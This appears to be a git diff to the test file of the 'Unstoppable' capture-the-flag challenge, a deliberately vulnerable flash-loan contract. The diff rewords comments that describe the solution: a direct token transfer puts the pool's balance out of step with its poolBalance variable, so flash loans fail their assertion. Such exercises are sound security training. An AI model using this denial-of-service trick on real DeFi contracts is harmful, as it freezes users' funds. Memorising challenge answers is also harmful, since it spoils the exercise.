@@ -47,8 +47,9 @@ describe("[Challenge] Unstoppable", function () {
 
   it("Exploit", async function () {
     /** YOUR EXPLOIT GOES HERE */
-    // send tokens to the contract without calling deposit
-    // makes the balance go up, but not poolBalance storage var
+    // need to break the functionality of the flash loan contract
+    // we can send tokens to the contract without calling deposit
+    // which makes the balance go up, but not poolBalance storage var
     // flashLoan will fail in assert
     await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, {
         from: attacker,
